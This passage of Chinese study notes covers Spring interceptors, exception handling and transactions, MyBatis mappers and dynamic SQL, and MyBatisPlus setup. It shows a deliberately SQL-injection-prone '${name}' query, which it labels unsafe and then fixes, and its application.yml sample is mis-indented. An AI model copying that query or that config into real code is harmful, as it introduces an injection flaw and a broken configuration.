- 当我们定义了拦截器后，会在执行Controller的方法之前，请求被拦截器拦截住。执行`preHandle()`方法，这个方法执行完成后需要返回一个布尔类型的值，如果返回true，就表示放行本次操作，才会继续访问controller中的方法；如果返回false，则不会放行（controller中的方法也不会执行）。

- 在controller当中的方法执行完毕之后，再回过来执行`postHandle()`这个方法以及`afterCompletion()` 方法，然后再返回给DispatcherServlet，最终再来执行过滤器当中放行后的这一部分逻辑的逻辑。执行完毕之后，最终给浏览器响应数据。

以上就是拦截器的执行流程。通过执行流程分析，大家应该已经清楚了过滤器和拦截器之间的区别，其实它们之间的区别主要是两点：

- 接口规范不同：过滤器需要实现Filter接口，而拦截器需要实现HandlerInterceptor接口。
- 拦截范围不同：过滤器Filter会拦截所有的资源，而Interceptor只会拦截Spring环境中的资源。



### 8、异常处理

####  8.1 问题分析

当我们前端像后端发送请求时，后端出现错误后抛出异常，如果前端没有做出对这种异常的响应时，那么用户就不会知道是什么异常，页面也没有任何反应。

![image-20230811151418312](./img/小米虫爬山路-img/image-20230811151418312.png)

我们来看一下出现异常之后，最终服务端给前端响应回来的数据长什么样。

![image-20230112130253486](./img/小米虫爬山路-img/image-20230112130253486.png) 

响应回来的数据是一个JSON格式的数据。但这种JSON格式的数据还是我们开发规范当中所提到的统一响应结果Result吗？显然并不是。由于返回的数据不符合开发规范，所以前端并不能解析出响应的JSON数据。

#### 8.2 解决方案

那么在三层构架项目中，出现了异常，该如何处理?

- 方案一：在所有Controller的所有方法中进行try…catch处理
  - 缺点：代码臃肿（不推荐）
- 方案二：全局异常处理器
  - 好处：简单、优雅（推荐）

![image-20230811151548359](./img/小米虫爬山路-img/image-20230811151548359.png)

#### 8.3 全局异常处理器

我们该怎么样定义全局异常处理器？

- 定义全局异常处理器非常简单，就是定义一个类，在类上加上一个注解@RestControllerAdvice，加上这个注解就代表我们定义了一个全局异常处理器。
- 在全局异常处理器当中，需要定义一个方法来捕获异常，在这个方法上需要加上注解@ExceptionHandler。通过@ExceptionHandler注解当中的value属性来指定我们要捕获的是哪一类型的异常。

~~~java
@RestControllerAdvice
public class GlobalExceptionHandler {

    //处理异常
    @ExceptionHandler(Exception.class) //指定能够处理的异常类型
    public Result ex(Exception e){
        e.printStackTrace();//打印堆栈中的异常信息

        //捕获到异常之后，响应一个标准的Result
        return Result.error("对不起,操作失败,请联系管理员");
    }
}
~~~

> @RestControllerAdvice = @ControllerAdvice + @ResponseBody
>
> 处理异常的方法返回值会转换为json后再响应给前端

以上就是全局异常处理器的使用，主要涉及到两个注解：

- @RestControllerAdvice  //表示当前类为全局异常处理器
- @ExceptionHandler  //指定可以捕获哪种类型的异常进行处理

### 9、事务处理

#### 9.1 事务回顾

在数据库阶段我们已学习过事务了，我们讲到：

**事务**是一组操作的集合，它是一个不可分割的工作单位。事务会把所有的操作作为一个整体，一起向数据库提交或者是撤销操作请求。所以这组操作要么同时成功，要么同时失败。



怎么样来控制这组操作，让这组操作同时成功或同时失败呢？此时就要涉及到事务的具体操作了。

事务的操作主要有三步：

1. 开启事务（一组操作开始前，开启事务）：start transaction / begin ;
2. 提交事务（这组操作全部成功后，提交事务）：commit ;
3. 回滚事务（中间任何一个操作出现异常，回滚事务）：rollback ;

#### 9.2 Spring事务管理

##### 9.2.1 案例

现在我们有两张表一张是部门表、一张员工表。

![image-20230811155914824](./img/小米虫爬山路-img/image-20230811155914824.png)

![image-20230811155938220](./img/小米虫爬山路-img/image-20230811155938220.png)

现在我们要删除部门表中的一个部门，相应的所属部门的员工就会被删除，当前端发出请求时就会调用下面的方法:

```java
 public void delete(Integer id){
        //根据部门id删除部门信息
        deptMapper.deleteById(id);

        //删除部门下的所有员工信息
        empMapper.deleteByDeptId(id);   
    }
```

但是如果在删除部门后程序排除异常那么后面删除员工的操作就不会执行。这时候就需要我们统一数据，开启事务

此时，我们就需要在delete删除业务功能中添加事务。

在方法运行之前，开启事务，如果方法成功执行，就提交事务，如果方法执行的过程当中出现异常了，就回滚事务。![image-20230811160451052](./img/小米虫爬山路-img/image-20230811160451052.png)

在方法运行之前，开启事务，如果方法成功执行，就提交事务，如果方法执行的过程当中出现异常了，就回滚事务。

所以在spring框架当中就已经把事务控制的代码都已经封装好了，并不需要我们手动实现。我们使用了spring框架，我们只需要通过一个简单的注解@Transactional就搞定了。

##### 9.2.2 Transactional注解

> @Transactional作用：就是在当前这个方法执行开始之前来开启事务，方法执行完毕之后提交事务。如果在这个方法执行的过程当中出现了异常，就会进行事务的回滚操作。
>
> @Transactional注解：我们一般会在业务层当中来控制事务，因为在业务层当中，一个业务功能可能会包含多个数据访问的操作。在业务层来控制事务，我们就可以将多个数据访问操作控制在一个事务范围内。

@Transactional注解书写位置：

- 方法
  - 当前方法交给spring进行事务管理
- 类
  - 当前类中所有的方法都交由spring进行事务管理
- 接口
  - 接口下所有的实现类当中所有的方法都交给spring 进行事务管理

```java
    @Override
    @Transactional  //当前方法添加了事务管理
public void delete(Integer id){
        //根据部门id删除部门信息
        deptMapper.deleteById(id);
        
        //模拟：异常发生
        int i = 1/0;

        //删除部门下的所有员工信息
        empMapper.deleteByDeptId(id);   
    }
```

说明：可以在application.yml配置文件中开启事务管理日志，这样就可以在控制看到和事务相关的日志信息了

~~~yaml
#spring事务管理日志
logging:
  level:
    org.springframework.jdbc.support.JdbcTransactionManager: debug
~~~

#### 9.3 事务进阶

前面我们通过spring事务管理注解@Transactional已经控制了业务层方法的事务。接下来我们要来详细的介绍一下@Transactional事务管理注解的使用细节。我们这里主要介绍@Transactional注解当中的两个常见的属性：

1. 异常回滚的属性：rollbackFor 
2. 事务传播行为：propagation

我们先来学习下rollbackFor属性。

##### 9.3.1 rollbackFor

我们在之前编写的业务方法上添加了@Transactional注解，来实现事务管理。

~~~java
@Transactional
public void delete(Integer id){
        //根据部门id删除部门信息
        deptMapper.deleteById(id);
        
        //模拟：异常发生
        int i = 1/0;

        //删除部门下的所有员工信息
        empMapper.deleteByDeptId(id);   
}
~~~

以上业务功能delete()方法在运行时，会引发除0的算数运算异常(RuntimeException运行时异常)，出现异常之后，由于我们在方法上加了@Transactional注解进行事务管理，所以发生异常会执行rollback回滚操作，从而保证事务操作前后数据是一致的。

下面我们在做一个测试，我们修改业务功能代码，在模拟异常的位置上直接抛出Exception异常（编译时异常）

~~~java
@Transactional
public void delete(Integer id) throws Exception {
        //根据部门id删除部门信息
        deptMapper.deleteById(id);
        
        //模拟：异常发生
        if(true){
            throw new Exception("出现异常了~~~");
        }

        //删除部门下的所有员工信息
        empMapper.deleteByDeptId(id);   
}
~~~

> 说明：默认情况下，只有出现RuntimeException(运行时异常)才会回滚事务。这时我们就需要使用rollbackFor来控制出现何种异常类型回滚事务。

```java
@Transactional(rollbackFor=Exception.class)
public void delete(Integer id) throws Exception {
        //根据部门id删除部门信息
        deptMapper.deleteById(id);
        
        //模拟：异常发生
        if(true){
            throw new Exception("出现异常了~~~");
        }

        //删除部门下的所有员工信息
        empMapper.deleteByDeptId(id);   
}
```

结论：

- 在Spring的事务管理中，默认只有运行时异常 RuntimeException才会回滚。
- 如果还需要回滚指定类型的异常，可以通过rollbackFor属性来指定。

##### 9.3.2 propagation

我们接着继续学习@Transactional注解当中的第二个属性propagation，这个属性是用来配置事务的传播行为的。

什么是事务的传播行为呢？

- 就是当一个事务方法被另一个事务方法调用时，这个事务方法应该如何进行事务控制。



例如：两个事务方法，一个A方法，一个B方法。在这两个方法上都添加了@Transactional注解，就代表这两个方法都具有事务，而在A方法当中又去调用了B方法。

![image-20230112152543953](./img/小米虫爬山路-img/image-20230112152543953.png) 

所谓事务的传播行为，指的就是在A方法运行的时候，首先会开启一个事务，在A方法当中又调用了B方法， B方法自身也具有事务，那么B方法在运行的时候，到底是加入到A方法的事务当中来，还是B方法在运行的时候新建一个事务？这个就涉及到了事务的传播行为。



我们要想控制事务的传播行为，在@Transactional注解的后面指定一个属性propagation，通过 propagation 属性来指定传播行为。接下来我们就来介绍一下常见的事务传播行为。

| **属性值**    | **含义**                                                     |
| ------------- | ------------------------------------------------------------ |
| REQUIRED      | 【默认值】需要事务，有则加入，无则创建新事务                 |
| REQUIRES_NEW  | 需要新事务，无论有无，总是创建新事务                         |
| SUPPORTS      | 支持事务，有则加入，无则在无事务状态中运行                   |
| NOT_SUPPORTED | 不支持事务，在无事务状态下运行,如果当前存在已有事务,则挂起当前事务 |
| MANDATORY     | 必须有事务，否则抛异常                                       |
| NEVER         | 必须没事务，否则抛异常                                       |
| …             |                                                              |

> 对于这些事务传播行为，我们只需要关注以下两个就可以了：
>
> 1. REQUIRED（默认值）
> 2. REQUIRES_NEW







## 十一、MyBatis

### 1、入门使用

在使用SpringBoot的情况下使用MyBatis来进行与数据库的交互

#### 1.1 准备工作

创建SpringBoot项目，项目中添加Mybatis依赖和MySQL驱动依赖

![image-20230809153441738](./img/小米虫爬山路-img/image-20230809153441738.png)

#### 1.2 配置MyBatis

> 在之前使用图形化客户端工具，连接MySQL数据库时，需要配置：
>
> ![image-20230809153540534](./img/小米虫爬山路-img/image-20230809153540534.png)
>
> 连接数据库的四大参数：
>
> - MySQL驱动类 
> - 登录名
> - 密码
> - 数据库连接字符串

基于上述分析，在Mybatis中要连接数据库，同样也需要以上4个参数配置。

在springboot项目中，可以编写`application.properties`文件，配置数据库连接信息。我们要连接数据库，就需要配置数据库连接的基本信息，包括：driver-class-name、url 、username，password。



application.properties:

```properties
#驱动类名称
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
#数据库连接的url
spring.datasource.url=jdbc:mysql://localhost:3306/数据库名
#连接数据库的用户名
spring.datasource.username=root
#连接数据库的密码
spring.datasource.password=密码
```

> 上述的配置，可以直接复制过去，不要敲错了。 全部都是 spring.datasource.xxxx 开头。且不能修改

#### 1.3 创建包文件

在MyBatis中推荐用名为mapper的包来创建一个持久层接口（Mybatis的持久层接口规范一般都叫 XxxMapper）。

如下一个名为: UserMapper的接口

```java
import com.itheima.pojo.User;
import org.apache.ibatis.annotations.Mapper;
import org.apache.ibatis.annotations.Select;
import java.util.List;

@Mapper
public interface UserMapper {
    
    //查询所有用户数据
    @Select("select id, name, age, gender, phone from user")
    public List<User> list();
    
}
```

> @Mapper注解：表示是mybatis中的Mapper接口
>
> - 程序运行时：框架会自动生成接口的实现类对象(代理对象)，并给交Spring的IOC容器管理
>
>  @Select注解：代表的就是select查询，用于书写select查询语句

#### 1.4 解决SQL警告与提示

默认我们在UserMapper接口上加的@Select注解中编写SQL语句是没有提示的。 如果想让idea给我们提示对应的SQL语句，我们需要在IDEA中配置与MySQL数据库的链接。 

默认我们在UserMapper接口上的@Select注解中编写SQL语句是没有提示的。如果想让idea给出提示，可以做如下配置：

![image-20230809154304279](./img/小米虫爬山路-img/image-20230809154304279.png)

配置完成之后，发现SQL语句中的关键字有提示了，但还存在不识别表名(列名)的情况：

![image-20230809154353859](./img/小米虫爬山路-img/image-20230809154353859.png)

> 产生原因：Idea和数据库没有建立连接，不识别表信息
>
> 解决方案：在Idea中配置MySQL数据库连接

![image-20230809154451451](./img/小米虫爬山路-img/image-20230809154451451.png)

在配置的时候指定连接那个数据库，如上图所示连接的就是mybatis数据库。

### 2、数据库连接池

数据库连接池是个容器，负责分配、管理数据库连接(Connection)

- 程序在启动时，会在数据库连接池(容器)中，创建一定数量的Connection对象

允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个

- 客户端在执行SQL时，先从连接池中获取一个Connection对象，然后在执行SQL语句，SQL语句执行完之后，释放Connection时就会把Connection对象归还给连接池（Connection对象可以复用）

释放空闲时间超过最大空闲时间的连接，来避免因为没有释放连接而引起的数据库连接遗漏

- 客户端获取到Connection对象了，但是Connection对象并没有去访问数据库(处于空闲)，数据库连接池发现Connection对象的空闲时间 > 连接池中预设的最大空闲时间，此时数据库连接池就会自动释放掉这个连接对象

数据库连接池的好处：

1. 资源重用
2. 提升系统响应速度
3. 避免数据库连接遗漏

常见的数据库连接池：

* C3P0
* DBCP
* Druid
* Hikari (springboot默认)

如果我们想把默认的数据库连接池切换为Druid数据库连接池，只需要完成以下两步操作即可：

1. 在pom.xml文件中引入依赖

```xml
<dependency>
    <!-- Druid连接池依赖 -->
    <groupId>com.alibaba</groupId>
    <artifactId>druid-spring-boot-starter</artifactId>
    <version>1.2.8</version>
</dependency>
```

2. 在application.properties中引入数据库连接配置

方式1：

~~~properties
spring.datasource.druid.driver-class-name=com.mysql.cj.jdbc.Driver
spring.datasource.druid.url=jdbc:mysql://localhost:3306/mybatis
spring.datasource.druid.username=root
spring.datasource.druid.password=1234
~~~

方式2：

~~~properties
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.datasource.url=jdbc:mysql://localhost:3306/mybatis
spring.datasource.username=root
spring.datasource.password=1234
~~~

### 3、lombok

#### 3.1 介绍

Lombok是一个实用的Java类库，可以通过简单的注解来简化和消除一些必须有但显得很臃肿的Java代码。

![image-20230809162319312](./img/小米虫爬山路-img/image-20230809162319312.png)

> 通过注解的形式自动生成构造器、getter/setter、equals、hashcode、toString等方法，并可以自动化生成日志变量，简化java开发、提高效率。

| **注解**            | **作用**                                                     |
| ------------------- | ------------------------------------------------------------ |
| @Getter/@Setter     | 为所有的属性提供get/set方法                                  |
| @ToString           | 会给类自动生成易阅读的  toString 方法                        |
| @EqualsAndHashCode  | 根据类所拥有的非静态字段自动重写 equals 方法和  hashCode 方法 |
| @Data               | 提供了更综合的生成代码功能（@Getter  + @Setter + @ToString + @EqualsAndHashCode） |
| @NoArgsConstructor  | 为实体类生成无参的构造器方法                                 |
| @AllArgsConstructor | 为实体类生成除了static修饰的字段之外带有各参数的构造器方法。 |

#### 3.2 使用

第1步：在pom.xml文件中引入依赖

```xml
<!-- 在springboot的父工程中，已经集成了lombok并指定了版本号，故当前引入依赖时不需要指定version -->
<dependency>
    <groupId>org.projectlombok</groupId>
    <artifactId>lombok</artifactId>
</dependency>
```

第2步：在实体类上添加注解

```java
import lombok.Data;

@Data
public class User {
    private Integer id;
    private String name;
    private Short age;
    private Short gender;
    private String phone;
}
```

> 在实体类上添加了@Data注解，那么这个类在编译时期，就会生成getter/setter、equals、hashcode、toString等方法。
>
> 说明：@Data注解中不包含全参构造方法，通常在实体类上，还会添加上：全参构造、无参构造

Lombok的注意事项：

- Lombok会在编译时，会自动生成对应的java代码
- 在使用lombok时，还需要安装一个lombok的插件（新版本的IDEA中自带）

![image-20230809162802799](./img/小米虫爬山路-img/image-20230809162802799.png)

### 4、Mybatis基础操作

MyBatis可以通过注解来编写sql语句，也可以通过配置文件来写sql语句

#### 4.1 删除

##### 4.1.1 语句

sql删除语句：

```sql
delete from 表名 where id = 1;#删除id为1的数据
```

Mybatis语句：

```java
@Mapper
public interface EmpMapper {
     //SQL语句中的id值不能写成固定数值，需要变为动态的数值
    //解决方案：在delete方法中添加一个参数(用户id)，将方法中的参数，传给SQL语句
@Delete("delete from 表名 where id = #{id}")//使用#{key}方式获取方法中的参数值
public void delete(Integer id)
}
```

@Delete注解：用于编写delete操作的SQL语句

##### 4.1.2 日志出入

在Mybatis当中我们可以借助日志，查看到sql语句的执行、执行传递的参数以及执行结果。具体操作如下：

1. 打开application.properties文件

2. 开启mybatis的日志，并指定输出到控制台

```properties
#指定mybatis输出日志的位置, 输出控制台
mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl
```

开启日志之后，我们再次运行单元测试，可以看到在控制台中，输出了以下的SQL语句信息：

![image-20230809165959784](./img/小米虫爬山路-img/image-20230809165959784.png)

> 但是我们发现输出的SQL语句：delete from emp where id = ?，我们输入的参数16并没有在后面拼接，id的值是使用?进行占位。那这种SQL语句我们称为预编译SQL。
>



#### 4.2 新增

##### 4.2.1 语句

SQL语句：

```sql
insert into 表名 (字段1，字段2，字段3.....)  values (值1，值2，值3...);
```

MyBatis语句：

```java
@Mapper
public interface EmpMapper {

    @Insert("insert into 表名 (字段1，字段2，字段3.....)  values (#{值1}，#{值2}，#{值3}...);")
    public void insert(Object arg);//对象arg中的属性名要与#{ }中的名称相同

}
```

说明：#{...} 里面写的名称是对象的属性名

> 注意事项：在项目开发中，建议使用#{...}，生成预编译SQL，防止SQL注入安全。

##### 4.2.2 主键返回

概念：在数据添加成功后，需要获取插入数据库数据的主键。

默认情况下，执行插入操作时，是不会主键值返回的。如果我们想要拿到主键值，需要在Mapper接口中的方法上添加一个Options注解，并在注解中指定属性useGeneratedKeys=true和keyProperty="实体类属性名"

```java
@Mapper
public interface EmpMapper {

    //会自动将生成的主键值，赋值给arg对象的id属性
    @Options(useGeneratedKeys = true,keyProperty = "属性名")
    @Insert("insert into 表名 (字段1，字段2，字段3.....)  values (#{值1}，#{值2}，#{值3}...);")
    public void insert(Object arg);//对象arg中的属性名要与#{ }中的名称相同

}
```

#### 4.3 更新

SQL语句：

```sql
update 表名 set 字段1= '值1' ，字段2 = '值2'，字段3 =  '值3' ... where id = 条件值;
```

接口方法：

```java
@Mapper
public interface EmpMapper {
  
    @Update("update 表名 set 字段1= #{值1} ，字段2 = #{值2}，字段3 =  #{值3} ... where id = #{条件值};")
    public void update(Object arg);
    
}
```

#### 4.4 查询

##### 4.4.1 语句

SQL语句：

```sql
select 字段1, 字段2,字段3...  from 表名 where id = 条件值
```

接口方法：

~~~java
@Mapper
public interface EmpMapper {
    
    @Select(select 字段1, 字段2,字段3...  from 表名 where id = #{id})
    public Emp getById(Integer id);
}
~~~

##### 4.4.2 数据封装

我们看到查询返回的结果中大部分字段是有值的，但是deptId，createTime，updateTime这几个字段是没有值的，而数据库中是有对应的字段值的，这是为什么呢？

![image-20230809172704944](./img/小米虫爬山路-img/image-20230809172704944.png)

原因如下： 

- 实体类属性名和数据库表查询返回的字段名一致，mybatis会自动封装。
- 如果实体类属性名和数据库表查询返回的字段名不一致，不能自动封装。 

方案一：**起别名**：在SQL语句中，对不一样的列名起别名，别名和实体类属性名一样

```java
@Select("select id, username, password, name, gender, image, job, entrydate, " +
        "dept_id AS deptId, create_time AS createTime, update_time AS updateTime " +
        "from emp " +
        "where id=#{id}")
public Emp getById(Integer id);
```

方案二：**手动结果映射**：通过 @Results及@Result 进行手动结果映射

```java
@Results({@Result(column = "dept_id", property = "deptId"),
          @Result(column = "create_time", property = "createTime"),
          @Result(column = "update_time", property = "updateTime")})
@Select("select id, username, password, name, gender, image, job, entrydate, dept_id, create_time, update_time from emp where id=#{id}")
public Emp getById(Integer id);
```

方案三：**开启驼峰命名(推荐)**：如果字段名与属性名符合驼峰命名规则，mybatis会自动通过驼峰命名规则映射

> 驼峰命名规则：   abc_xyz    =>   abcXyz
>
> - 表中字段名：abc_xyz
> - 类中属性名：abcXyz

```properties
# 在application.properties中添加：
mybatis.configuration.map-underscore-to-camel-case=true
```

> 要使用驼峰命名前提是 实体类的属性 与 数据库表中的字段名严格遵守驼峰命名。

##### 4.4.3 条件查询

这里有个案例展示。

在员工管理的列表页面中，我们需要根据条件查询员工信息，查询条件包括：姓名、性别、入职时间。 

![image-20230809193540824](./img/小米虫爬山路-img/image-20230809193540824.png)

通过页面原型以及需求描述我们要实现的查询：

- 姓名：要求支持模糊匹配
- 性别：要求精确匹配
- 入职时间：要求进行范围查询
- 根据最后修改时间进行降序排序

SQL语句：

```sql
select id, username, password, name, gender, image, job, entrydate, dept_id, create_time, update_time 
from emp 
where name like '%张%' 
      and gender = 1 
      and entrydate between '2010-01-01' and '2020-01-01 ' 
order by update_time desc;
```

接口方法：

- 方式一

```java
@Mapper
public interface EmpMapper {
    @Select("select * from emp " +
            "where name like '%${name}%' " +
            "and gender = #{gender} " +
            "and entrydate between #{begin} and #{end} " +
            "order by update_time desc")
    public List<Emp> list(String name, Short gender, LocalDate begin, LocalDate end);
}
```

但是这种有${}不安全

- 方式二（解决SQL注入风险）
  - 使用MySQL提供的字符串拼接函数：concat('%' , '关键字' , '%')

~~~java
@Mapper
public interface EmpMapper {

    @Select("select * from emp " +
            "where name like concat('%',#{name},'%') " +
            "and gender = #{gender} " +
            "and entrydate between #{begin} and #{end} " +
            "order by update_time desc")
    public List<Emp> list(String name, Short gender, LocalDate begin, LocalDate end);

}

~~~

### 5、XML映射文件

#### 5.1 规范

使用Mybatis的注解方式，主要是来完成一些简单的增删改查功能。如果需要实现复杂的SQL功能，建议使用XML来配置映射语句，也就是将SQL语句写在XML配置文件中。

在Mybatis中使用XML映射文件方式开发，需要符合一定的规范：

1. XML映射文件的名称与Mapper接口名称一致，并且将XML映射文件和Mapper接口放置在相同包下（同包同名）

2. XML映射文件的namespace属性为Mapper接口全类名一致

3. XML映射文件中sql语句的id与Mapper接口中的方法名一致，并保持返回类型一致。

![image-20221212153529732](./img/小米虫爬山路-img/image-20221212153529732.png)

> \<select>标签：就是用于编写select查询语句的。
>
> - resultType属性，指的是查询返回的单条记录所封装的类型。

#### 5.2 XML配置文件实现

第1步：创建XML映射文件

![image-20230809201504755](./img/小米虫爬山路-img/image-20230809201504755.png)

![image-20230809201516162](./img/小米虫爬山路-img/image-20230809201516162.png)

![image-20230809201520207](./img/小米虫爬山路-img/image-20230809201520207.png)

第2步：编写XML映射文件

> xml映射文件中的dtd约束，直接从mybatis官网复制即可

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
  PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
  "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="">
 
</mapper>
```

配置：XML映射文件的namespace属性为Mapper接口全限定名

![image-20230809201648772](./img/小米虫爬山路-img/image-20230809201648772.png)

配置：XML映射文件中sql语句的id与Mapper接口中的方法名一致，并保持返回类型一致

![image-20230809201711610](./img/小米虫爬山路-img/image-20230809201711610.png)

学习了Mybatis中XML配置文件的开发方式了，大家可能会存在一个疑问：到底是使用注解方式开发还是使用XML方式开发？

**结论：**使用Mybatis的注解，主要是来完成一些简单的增删改查功能。如果需要实现复杂的SQL功能，建议使用XML来配置映射语句。

### 6、Mybatis动态SQL

#### 6.1 什么是动态SQL

SQL语句会随着用户的输入或外部条件的变化而变化，我们称为：**动态SQL**。

在页面原型中，列表上方的条件是动态的，是可以不传递的，也可以只传递其中的1个或者2个或者全部。

![image-20230809202918961](./img/小米虫爬山路-img/image-20230809202918961.png)

![image-20230809202952715](./img/小米虫爬山路-img/image-20230809202952715.png)

而在我们刚才编写的SQL语句中，我们会看到，我们将三个条件直接写死了。 如果页面只传递了参数姓名name 字段，其他两个字段 性别 和 入职时间没有传递，那么这两个参数的值就是null。

此时，执行的SQL语句为：

这个查询结果是不正确的。正确的做法应该是：传递了参数，再组装这个查询条件；如果没有传递参数，就不应该组装这个查询条件。



比如：如果姓名输入了"张", 对应的SQL为:

```sql
select *  from emp where name like '%张%' order by update_time desc;
```



如果姓名输入了"张",，性别选择了"男"，则对应的SQL为:

```sql
select *  from emp where name like '%张%' and gender = 1 order by update_time desc;
```

![image-20230809203106100](./img/小米虫爬山路-img/image-20230809203106100.png)

在Mybatis中提供了很多实现动态SQL的标签，我们学习Mybatis中的动态SQL就是掌握这些动态SQL标签。

#### 6.2 动态SQL-if

`<if>`：用于判断条件是否成立。使用test属性进行条件判断，如果条件为true，则拼接SQL。

```xml
<if test="条件表达式">
   要拼接的sql语句
</if>
```

##### 6.2.1 条件查询

示例：把SQL语句改造为动态SQL方式

- 原有的SQL语句

~~~xml
<select id="list" resultType="com.itheima.pojo.Emp">
        select * from emp
        where name like concat('%',#{name},'%')
              and gender = #{gender}
              and entrydate between #{begin} and #{end}
        order by update_time desc
</select>
~~~

- 动态SQL语句

~~~xml
<select id="list" resultType="com.itheima.pojo.Emp">
        select * from emp
        <where>
               <if test="name != null">
                 name like concat('%',#{name},'%')
             </if>
             <if test="gender != null">
                 and gender = #{gender}
             </if>
             <if test="begin != null and end != null">
                 and entrydate between #{begin} and #{end}
             </if>
    </where>
    
        order by update_time desc
</select>
~~~

使用`<where>`标签代替SQL语句中的where关键字

- `<where>`只会在子元素有内容的情况下才插入where子句，而且会自动去除子句的开头的AND或OR

还有在更新是也会出现一些问题所以Mybatis使用`<set>`来动态的在SQL语句中插入set关键字，并会删掉额外的逗号。（用于update语句中）

**小结**

- `<if>`

  - 用于判断条件是否成立，如果条件为true，则拼接SQL

  - 形式：

    ~~~xml
    <if test="name != null"> … </if>
    ~~~

- `<where>`

  - where元素只会在子元素有内容的情况下才插入where子句，而且会自动去除子句的开头的AND或OR

- `<set>`

  - 动态地在行首插入 SET 关键字，并会删掉额外的逗号。（用在update语句中）

#### 6.3 动态SQL-foreach

案例：员工删除功能（既支持删除单条记录，又支持批量删除）

![image-20230809204352949](./img/小米虫爬山路-img/image-20230809204352949.png)

SQL语句：

~~~mysql
delete from emp where id in (1,2,3);
~~~

Mapper接口：

~~~java
@Mapper
public interface EmpMapper {
    //批量删除
    public void deleteByIds(List<Integer> ids);
}
~~~

XML映射文件：

- 使用`<foreach>`遍历deleteByIds方法中传递的参数ids集合

~~~xml
<foreach collection="集合名称" item="集合遍历出来的元素/项" separator="每一次遍历使用的分隔符" 
         open="遍历开始前拼接的片段" close="遍历结束后拼接的片段">
</foreach>
~~~

~~~xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "https://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.itheima.mapper.EmpMapper">
    <!--删除操作-->
    <delete id="deleteByIds">
        delete from emp where id in
        <foreach collection="ids" item="id" separator="," open="(" close=")">
            #{id}
        </foreach>
    </delete>
</mapper> 
~~~

![image-20230809204856432](./img/小米虫爬山路-img/image-20230809204856432.png)

#### 6.4 动态SQL-sql&include

问题分析：

- 在xml映射文件中配置的SQL，有时可能会存在很多重复的片段，此时就会存在很多冗余的代码

我们可以对重复的代码片段进行抽取，将其通过`<sql>`标签封装到一个SQL片段，然后再通过`<include>`标签进行引用。

- `<sql>`：定义可重用的SQL片段

- `<include>`：通过属性refid，指定包含的SQL片段

![image-20230809205159187](./img/小米虫爬山路-img/image-20230809205159187.png)

SQL片段： 抽取重复的代码

```xml
<sql id="commonSelect">
 	select id, username, password, name, gender, image, job, entrydate, dept_id, create_time, update_time from emp
</sql>
```

然后通过`<include>` 标签在原来抽取的地方进行引用。操作如下：

```xml
<select id="list" resultType="com.itheima.pojo.Emp">
    <include refid="commonSelect"/>
    <where>
        <if test="name != null">
            name like concat('%',#{name},'%')
        </if>
        <if test="gender != null">
            and gender = #{gender}
        </if>
        <if test="begin != null and end != null">
            and entrydate between #{begin} and #{end}
        </if>
    </where>
    order by update_time desc
</select>
```

## 十二、MyBatisPlus

MybatisPlus(简称MP)是基于MyBatis框架基础上开发的增强型工具，旨在简化开发、提供效率。

### 1、入门案例

#### 1.1 创建数据库及表

```sql
create database if not exists 数据库名 character set utf8;
use 数据库名;
CREATE TABLE user (
    id bigint(20) primary key auto_increment,
    name varchar(32) not null,
    password  varchar(32) not null,
    age int(3) not null ,
    tel varchar(32) not null
);
insert into user values(1,'Tom','tom',3,'18866668888');
insert into user values(2,'Jerry','jerry',4,'16688886666');
insert into user values(3,'Jock','123456',41,'18812345678');
insert into user values(4,'传智播客','itcast',15,'4006184000');
```

#### 1.2 创建SpringBoot工程

![1630998241426](./img/小米虫爬山路-img/1630998241426.png)

#### 1.3 勾选配置使用技术

![1630998321660](./img/小米虫爬山路-img/1630998321660.png)

**说明:**

* 由于MP并未被收录到idea的系统内置配置，无法直接选择加入，需要手动在pom.xml中配置添加

#### 1.4 pom.xml补全依赖

```xml
<dependency>
    <groupId>com.baomidou</groupId>
    <artifactId>mybatis-plus-boot-starter</artifactId>
    <version>3.4.1</version>
</dependency>
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>druid</artifactId>
    <version>1.1.16</version>
</dependency>
```

**说明:**

* druid数据源可以加也可以不加，SpringBoot有内置的数据源，可以配置成使用Druid数据源

#### 1.5 添加MP的相关配置信息

resources默认生成的是properties配置文件，可以将其替换成yml文件，并在文件中配置数据库连接的相关信息:`application.yml`

```yml
spring:
  datasource:
    type: com.alibaba.druid.pool.DruidDataSource
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/数据库名?serverTimezone=UTC 
    username: 用户名
    password: 密码
    
mybatis-plus:
  mapper-locations: classpath:mapper/*.xml
  configuration:
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl
    #开启驼峰转换
    map-underscore-to-camel-case: true
    #全局默认主键类型，设置后，即可省略实体对象中的@TableId(type = IdType.AUTO)配置。注意必须要是数据库由主键自增策略才能用
    global-config:
   	db-config:
      id-type: auto
```

**说明:**==serverTimezone是用来设置时区，UTC是标准时区，和咱们的时间差8小时，所以可以将其修改为`Asia/Shanghai`==

#### 1.6 根据数据库表创建实体类

```java
public class User {   
    private Long id;
    private String name;
    private String password;
    private Integer age;
    private String tel;
    //setter...getter...toString方法略
}
```

注意：这里可以使用Lombok来简化setter、getter的书写

#### 1.7 创建Dao接口

```java
@Mapper
public interface UserDao extends BaseMapper<User>{
}
```

#### 1.8 编写引导类

```java
@SpringBootApplication
//@MapperScan("com.itheima.dao")
public class Mybatisplus01QuickstartApplication {
    public static void main(String[] args) {
        SpringApplication.run(Mybatisplus01QuickstartApplication.class, args);
    }

}
```

**说明:**Dao接口要想被容器扫描到，有两种解决方案:

* 方案一:在Dao接口上添加`@Mapper`注解，并且确保Dao处在引导类所在包或其子包中
  * 该方案的缺点是需要在每一Dao接口中添加注解
* 方案二:在引导类上添加`@MapperScan`注解，其属性为所要扫描的Dao所在包
  * 该方案的好处是只需要写一次，则指定包下的所有Dao接口都能被扫描到，`@Mapper`就可以不写。

#### 1.9 编写测试类

```java
@SpringBootTest
class MpDemoApplicationTests {

